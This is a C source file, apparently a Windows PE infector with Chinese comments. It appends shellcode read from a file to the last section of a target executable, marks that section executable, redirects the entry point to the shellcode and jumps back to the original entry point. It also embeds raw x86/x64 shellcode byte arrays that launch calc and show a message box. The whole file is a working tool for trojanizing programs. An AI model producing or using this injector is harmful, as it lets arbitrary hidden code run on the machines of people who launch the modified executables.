#include <Windows.h>
#define SHELLCODE_FILENAME L"shellcode.bin"
#define OUTPUT_FILENAME L"__injected.exe"
/*
*/
#include <stdio.h>
#include <tchar.h>
int PrintNumber(__in int nNumber)
{
  _TCHAR szBuffer[100];
  
  _stprintf(szBuffer, _T("%i"), nNumber);
  return MessageBox(NULL, szBuffer, _T("wat"), MB_OK);
}
void print_128_bit_chunk( unsigned char* chunk ) {
    printf( "%08x %08x %08x %08x\n" ,
            chunk[0] << 24 | chunk[1] << 16 | chunk[2] << 8 | chunk[3] ,
            chunk[4] << 24 | chunk[5] << 16 | chunk[6] << 8 | chunk[7] ,
            chunk[8] << 24 | chunk[9] << 16 | chunk[10] << 8 | chunk[11] ,
            chunk[12] << 24 | chunk[13] << 16 | chunk[14] << 8 | chunk[15] ) ;
}
unsigned char shellcode_ori[] = 
/*
// calc x86 & x64
"\x50\x54\x58\x66\x83\xe4\xf0\x50\x31\xc0\x40\x92\x74\x50\x60" 
"\x4a\x52\x68\x63\x61\x6c\x63\x54\x59\x52\x51\x64\x8b\x72\x30" 
"\x8b\x76\x0c\x8b\x76\x0c\xad\x8b\x30\x8b\x7e\x18\x8b\x5f\x3c" 
"\x8b\x5c\x3b\x78\x8b\x74\x1f\x20\x01\xfe\x8b\x54\x1f\x24\x0f" 
"\xb7\x2c\x17\x42\x42\xad\x81\x3c\x07\x57\x69\x6e\x45\x75\xf0" 
"\x8b\x74\x1f\x1c\x01\xfe\x03\x3c\xae\xff\xd7\x58\x58\x61\x5c" 
"\x92\x58\xeb\x66\x50\x51\x53\x56\x57\x55\xb2\x60\x68\x63\x61" 
"\x6c\x63\x54\x59\x48\x29\xd4\x65\x48\x8b\x32\x48\x8b\x76\x18" 
"\x48\x8b\x76\x10\x48\xad\x48\x8b\x30\x48\x8b\x7e\x30\x03\x57" 
"\x3c\x8b\x5c\x17\x28\x8b\x74\x1f\x20\x48\x01\xfe\x8b\x54\x1f" 
"\x24\x0f\xb7\x2c\x17\x8d\x52\x02\xad\x81\x3c\x07\x57\x69\x6e" 
"\x45\x75\xef\x8b\x74\x1f\x1c\x48\x01\xfe\x8b\x34\xae\x48\x01" 
"\xf7\x99\xff\xd7\x48\x83\xc4\x68\x5d\x5f\x5e\x5b\x59\x5a\x5c" 
"\x58"
// msgbox block x86
"\x55\x8b\xec\x83\xec\x0c\x53\x8d\x45\xf4\x33\xdb\x50\xb9\x4c" 
"\x77\x26\x07\xc7\x45\xf4\x75\x73\x65\x72\xc7\x45\xf8\x33\x32" 
"\x2e\x64\x66\xc7\x45\xfc\x6c\x6c\x88\x5d\xfe\xe8\x1a\x00\x00" 
"\x00\xff\xd0\x53\x53\x53\x53\xb9\x45\x83\x56\x07\xe8\x0a\x00" 
"\x00\x00\xff\xd0\xe9\xdb\x00\x00\x00\x5b\xc9\xc3\x83\xec\x10" 
"\x64\xa1\x30\x00\x00\x00\x53\x8b\x40\x0c\x55\x56\x8b\x70\x0c" 
"\x57\x89\x4c\x24\x18\xe9\x8a\x00\x00\x00\x8b\x46\x30\x8b\x5e" 
"\x2c\x8b\x36\x89\x44\x24\x14\x8b\x42\x3c\x33\xc9\x8b\x6c\x10" 
"\x78\x89\x6c\x24\x10\x85\xed\x74\x6d\xc1\xeb\x10\x33\xff\x85" 
"\xdb\x74\x1f\x8b\x6c\x24\x14\xc1\xc9\x0d\x8a\x04\x2f\x3c\x61" 
"\x0f\xbe\xc0\x7c\x03\x83\xc1\xe0\x03\xc8\x47\x3b\xfb\x72\xe9" 
"\x8b\x6c\x24\x10\x8b\x7c\x2a\x18\x8b\x44\x2a\x20\x03\xc2\x33" 
"\xdb\x89\x7c\x24\x14\x85\xff\x74\x31\x8b\x28\x33\xff\x03\xea" 
"\x83\xc0\x04\x89\x44\x24\x1c\xc1\xcf\x0d\x0f\xbe\x45\x00\x03" 
"\xf8\x45\x80\x7d\xff\x00\x75\xf0\x8d\x04\x0f\x3b\x44\x24\x18" 
"\x74\x20\x8b\x44\x24\x1c\x43\x3b\x5c\x24\x14\x72\xcf\x8b\x56" 
"\x18\x85\xd2\x0f\x85\x6b\xff\xff\xff\x33\xc0\x5f\x5e\x5d\x5b" 
"\x83\xc4\x10\xc3\x8b\x74\x24\x10\x8b\x44\x16\x24\x8d\x04\x58" 
"\x0f\xb7\x0c\x10\x8b\x44\x16\x1c\x8d\x04\x88\x8b\x04\x10\x03" 
"\xc2\xeb\xdb\x90"
*/
// msg block x64
"\xe9\x5b\x01\x00\x00\xcc\xcc\xcc\x48\x89\x5c\x24\x08\x48\x89" 
"\x74\x24\x10\x57\x48\x83\xec\x10\x65\x48\x8b\x04\x25\x60\x00" 
"\x00\x00\x8b\xf1\x48\x8b\x50\x18\x4c\x8b\x4a\x10\x4d\x8b\x41" 
"\x30\x4d\x85\xc0\x0f\x84\xb8\x00\x00\x00\x41\x0f\x10\x41\x58" 
"\x49\x63\x40\x3c\x4d\x8b\x09\x42\x8b\x9c\x00\x88\x00\x00\x00" 
"\x33\xd2\xf3\x0f\x7f\x04\x24\x85\xdb\x74\xd4\x48\x8b\x04\x24" 
"\x48\xc1\xe8\x10\x44\x0f\xb7\xd0\x45\x85\xd2\x74\x20\x48\x8b" 
"\x4c\x24\x08\x45\x8b\xda\xc1\xca\x0d\x80\x39\x61\x0f\xbe\x01" 
"\x7c\x03\x83\xc2\xe0\x03\xd0\x48\xff\xc1\x49\xff\xcb\x75\xe8" 
"\x4d\x8d\x14\x18\x33\xc9\x41\x8b\x7a\x20\x49\x03\xf8\x41\x39" 
"\x4a\x18\x76\x90\x8b\x1f\x45\x33\xdb\x48\x8d\x7f\x04\x49\x03" 
"\xd8\x41\xc1\xcb\x0d\x0f\xbe\x03\x48\xff\xc3\x44\x03\xd8\x80" 
"\x7b\xff\x00\x75\xed\x41\x8d\x04\x13\x3b\xc6\x74\x0d\xff\xc1" 
"\x41\x3b\x4a\x18\x72\xd1\xe9\x5c\xff\xff\xff\x41\x8b\x42\x24" 
"\x03\xc9\x49\x03\xc0\x0f\xb7\x04\x01\x41\x8b\x4a\x1c\xc1\xe0" 
"\x02\x48\x98\x49\x03\xc0\x8b\x04\x01\x49\x03\xc0\xeb\x02\x33" 
"\xc0\x48\x8b\x5c\x24\x20\x48\x8b\x74\x24\x28\x48\x83\xc4\x10" 
"\x5f\xc3\xcc\xcc\xcc\x40\x55\x48\x8b\xec\x48\x83\xec\x30\xb9" 
"\x4c\x77\x26\x07\xc7\x45\xf0\x75\x73\x65\x72\xc7\x45\xf4\x33" 
"\x32\x2e\x64\x66\xc7\x45\xf8\x6c\x6c\xc6\x45\xfa\x00\xe8\xd9" 
"\xfe\xff\xff\x48\x8d\x4d\xf0\xff\xd0\xb9\x45\x83\x56\x07\xe8" 
"\xc9\xfe\xff\xff\x45\x33\xc9\x45\x33\xc0\x33\xd2\x33\xc9\xff" 
"\xd0\xe8\x30\x00\x00\x00\x48\x83\xc4\x30\x5d\xc3\xcc\xcc\xcc" 
"\xcc\xcc\xcc\xcc\xcc\xcc\xcc\x56\x48\x8b\xf4\x48\x83\xe4\xf0" 
"\x48\x83\xec\x20\xe8\x93\xff\xff\xff\x48\x8b\xe6\x5e\xc3\xcc" 
"\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xeb\x00"
;
int wmain(int argc, wchar_t* argv[]) {
	HANDLE hFile_bin		=	CreateFile( SHELLCODE_FILENAME , GENERIC_READ , FILE_SHARE_READ , NULL , OPEN_EXISTING , 0 , NULL ) ;
	HANDLE hFile		=	CreateFile( argv[1] , GENERIC_READ , FILE_SHARE_READ , NULL , OPEN_EXISTING , 0 , NULL ) ;
	HANDLE hFile_out	=	CreateFile( OUTPUT_FILENAME ,                // name of the write
								GENERIC_WRITE,          // open for writing
								0,                      // do not share
								NULL,                   // default security
								CREATE_ALWAYS,             // create new file only
								FILE_ATTRIBUTE_NORMAL,  // normal file
								NULL); 
	DWORD binFileSize ;
	BYTE* binContent ;
	if( hFile_bin != INVALID_HANDLE_VALUE ) {
		DWORD dwRead ;
		binFileSize = GetFileSize(hFile_bin, NULL); 
		binContent = ( BYTE* )LocalAlloc( LMEM_FIXED , binFileSize ) ;
		if (binContent != NULL)
		{
			ReadFile(hFile_bin, binContent, binFileSize, &dwRead, NULL);
		}
		if( dwRead < binFileSize ) {
			MessageBox( NULL , L"内存不足无法读取"SHELLCODE_FILENAME , NULL , NULL ) ;
			exit( -1 ) ;
		}
	}
	else{
		MessageBox( NULL , SHELLCODE_FILENAME L"不存在" , NULL , NULL ) ;
	}
	if( hFile != INVALID_HANDLE_VALUE && hFile_out != INVALID_HANDLE_VALUE ) {
        DWORD dwFileSize = GetFileSize(hFile, NULL); 
        if (dwFileSize != INVALID_FILE_SIZE)
        { 
            BYTE* pszFileText = (BYTE*) LocalAlloc(LMEM_FIXED, dwFileSize); 
            if (pszFileText != NULL)
            {
                DWORD dwRead,dwWrite; 
				WORD number_of_section ;
				DWORD size_of_image ;
				DWORD section_alignment ;
				DWORD file_alignment ;
				DWORD SizeOfRawData_added ;
				DWORD VirtualSize_added ;
				DWORD OEP ;
				DWORD jmp_to ;
				IMAGE_DOS_HEADER* p_dos_header ;
				IMAGE_NT_HEADERS* p_nt_header ;
				IMAGE_SECTION_HEADER* p_section_header ;
				IMAGE_SECTION_HEADER* last_section_header ;
				BYTE* pszFileText_out ;
				unsigned char* shellcode ;
				DWORD sizeof_shellcode ;
				ReadFile(hFile, pszFileText, dwFileSize, &dwRead, NULL);
				if( dwRead < dwFileSize ) {
					MessageBox( NULL , L"内存不足无法读取" , NULL , NULL ) ;
					exit( -1 ) ;
				}
				p_dos_header				=	( IMAGE_DOS_HEADER* )pszFileText ;
				p_nt_header					=	( IMAGE_NT_HEADERS* )( pszFileText + p_dos_header->e_lfanew ) ;
				number_of_section			=	p_nt_header->FileHeader.NumberOfSections ;
				p_section_header			=	( IMAGE_SECTION_HEADER* )( pszFileText + p_dos_header->e_lfanew + sizeof( IMAGE_NT_HEADERS ) ) ;
				last_section_header			=	( IMAGE_SECTION_HEADER* )( ( BYTE* )p_section_header + ( number_of_section - 1 ) * sizeof( IMAGE_SECTION_HEADER ) ) ;
				file_alignment				=	p_nt_header->OptionalHeader.FileAlignment ; 
				section_alignment			=	p_nt_header->OptionalHeader.SectionAlignment ; 	
				sizeof_shellcode			=	binFileSize + sizeof( DWORD ) + 1 ;
				//sizeof_shellcode			=	sizeof( shellcode_ori ) + sizeof( DWORD ) ;
				shellcode					=	( unsigned char* )LocalAlloc( LMEM_FIXED , sizeof_shellcode ) ;			
				SizeOfRawData_added			=	( ( sizeof_shellcode / file_alignment ) + 1 ) * file_alignment ;
				VirtualSize_added			=	( ( sizeof_shellcode / section_alignment ) + 1 ) * section_alignment ;
				OEP							=	p_nt_header->OptionalHeader.AddressOfEntryPoint ;
				jmp_to						=   OEP - ( last_section_header->VirtualAddress + last_section_header->SizeOfRawData +  sizeof_shellcode ) ;
				// jmp 回去
				CopyMemory( shellcode , binContent , binFileSize ) ; 
				CopyMemory( shellcode + binFileSize , "\xe9" , 1 ) ;
				*( DWORD* )( shellcode + binFileSize + 1 ) = jmp_to ;
				/*
				CopyMemory( shellcode , shellcode_ori , sizeof( shellcode_ori ) - 1 ) ; // 去掉结尾的 '\0'
				CopyMemory( shellcode + sizeof( shellcode_ori ) - 1 , "\xe9" , 1 ) ;
				*( DWORD* )( shellcode + sizeof( shellcode_ori ) ) = jmp_to ;
				*/
				// 改入口
				p_nt_header->OptionalHeader.AddressOfEntryPoint = last_section_header->VirtualAddress + last_section_header->SizeOfRawData ;
				// 改size
				last_section_header->SizeOfRawData	+=	SizeOfRawData_added ;
				last_section_header->Misc.VirtualSize += VirtualSize_added ;
				p_nt_header->OptionalHeader.SizeOfImage = last_section_header->VirtualAddress + last_section_header->Misc.VirtualSize ;
				// 加可执行属性
				last_section_header->Characteristics |= IMAGE_SCN_MEM_EXECUTE ;
				// 写入新文件
				pszFileText_out = (BYTE*) LocalAlloc( LMEM_FIXED, dwFileSize + SizeOfRawData_added ); 
				CopyMemory( pszFileText_out , pszFileText , dwFileSize ) ;
				CopyMemory( ( (BYTE*)pszFileText_out ) + dwFileSize , shellcode , sizeof_shellcode ) ;
				ZeroMemory( ( (BYTE*)pszFileText_out ) + dwFileSize + sizeof_shellcode , SizeOfRawData_added - sizeof_shellcode ) ;
				WriteFile( 
                    hFile_out,           // open file handle
                    pszFileText_out,      // start of data to write
                    dwFileSize + SizeOfRawData_added,  // number of bytes to write
                    &dwWrite, // number of bytes that were written
                    NULL);  
                LocalFree(shellcode);
                LocalFree(pszFileText);
                LocalFree(pszFileText_out);
				LocalFree(binContent);
            } 
        } 
        CloseHandle(hFile); 
        CloseHandle(hFile_out); 
	}
	else{
		MessageBox( NULL , L"打开/创建 exe 文件失败" , NULL , NULL ) ;
	}
	return 0 ;
}